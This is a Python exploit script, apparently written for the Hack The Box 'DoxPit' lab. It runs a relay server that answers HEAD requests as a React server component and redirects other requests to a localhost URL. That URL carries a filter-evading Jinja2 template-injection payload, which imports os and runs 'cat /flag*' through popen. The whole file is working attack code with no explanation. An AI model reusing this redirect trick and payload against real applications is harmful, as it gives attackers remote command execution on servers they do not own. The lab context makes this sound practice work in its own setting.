#!/usr/bin/env python3
"""Temporary relay for the authorized HTB DoxPit lab."""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlencode

PAYLOAD = "{%with a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}"
TARGET = "http://127.0.0.1:3000/home?" + urlencode({
    "token": "fd21baf3c637742af65b71ae1b9585b7",
    "directory": PAYLOAD,
    "globals": "__globals__",
    "getitem": "__getitem__",
    "builtins": "__builtins__",
    "import": "__import__",
    "cmd": "cat /flag*",
})


class Relay(BaseHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/x-component")
        self.end_headers()

    def do_GET(self):
        print("GET", self.path, "Host=", self.headers.get("Host"), flush=True)
        self.send_response(302)
        self.send_header("Location", TARGET)
        self.end_headers()

    def do_POST(self):
        self.do_GET()

    def log_message(self, *_):
        pass


HTTPServer(("0.0.0.0", 8080), Relay).serve_forever()
